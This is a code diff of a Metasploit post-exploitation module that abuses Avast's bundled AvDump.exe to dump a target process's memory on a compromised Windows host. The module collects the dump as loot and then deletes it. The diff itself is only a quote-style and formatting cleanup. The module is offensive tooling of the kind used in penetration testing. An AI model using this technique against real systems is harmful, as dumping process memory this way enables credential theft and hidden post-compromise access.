@@ -9,26 +9,29 @@ class MetasploitModule < Msf::Post
   include Msf::Post::File
 
   def initialize(info = {})
-    super(update_info(info,
-        'Name'          => 'Avast AV Memory Dumping Utility',
-        'Description'   => %q{
-            This module leverages an Avast Anti-Virus memory dump utility that is shipped
-            by default with Avast Anti-Virus Home software suite.
+    super(
+      update_info(
+        info,
+        'Name' => 'Avast AV Memory Dumping Utility',
+        'Description' => %q{
+          This module leverages an Avast Anti-Virus memory dump utility that is shipped
+          by default with Avast Anti-Virus Home software suite.
         },
-        'License'       => MSF_LICENSE,
-        'Author'        => [ 'DLL_Cool_J' ],
-        'Platform'      => [ 'win'],
-        'SessionTypes'  => [ 'meterpreter']
-    ))
+        'License' => MSF_LICENSE,
+        'Author' => [ 'DLL_Cool_J' ],
+        'Platform' => [ 'win'],
+        'SessionTypes' => [ 'meterpreter']
+      )
+    )
 
-    register_options ( [
-        OptString.new('PID', [true, 'specify pid to dump' ]),
-        OptString.new('DUMP_PATH', [true, 'specify location to write dump file to', "C:\\Users\\Public\\tmp.dmp"])
+    register_options([
+      OptString.new('PID', [true, 'specify pid to dump' ]),
+      OptString.new('DUMP_PATH', [true, 'specify location to write dump file to', 'C:\\Users\\Public\\tmp.dmp'])
     ])
   end
 
   def avdump_exists?
-    file_exist?("C:\\Program Files\\Avast Software\\Avast\\AvDump.exe")
+    file_exist?('C:\\Program Files\\Avast Software\\Avast\\AvDump.exe')
   end
 
   def run
@@ -45,7 +48,7 @@ class MetasploitModule < Msf::Post
     fail_with(Failure::Unknown, "Dump file #{dump_path} was not created") unless file_exist?(dump_path)
     print_status(dump_path)
     mem_file = read_file(dump_path)
-    store_loot("host.avast.memdump", "binary/db", session, mem_file)
+    store_loot('host.avast.memdump', 'binary/db', session, mem_file)
 
     print_status(result)
     rm_f(dump_path)
